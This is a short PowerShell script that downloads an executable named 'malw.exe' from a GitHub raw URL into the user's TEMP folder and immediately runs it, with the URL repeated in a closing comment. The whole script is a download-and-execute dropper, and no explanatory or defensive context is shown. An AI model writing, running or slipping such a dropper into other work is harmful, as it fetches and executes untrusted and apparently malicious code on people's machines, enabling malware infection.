$url = "https://raw.githubusercontent.com/jessiejobston/mytest/refs/heads/main/malw.exe"
$out = "$env:TEMP\file.exe"

Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out


# https://raw.githubusercontent.com/jessiejobston/mytest/refs/heads/main/malw.exe
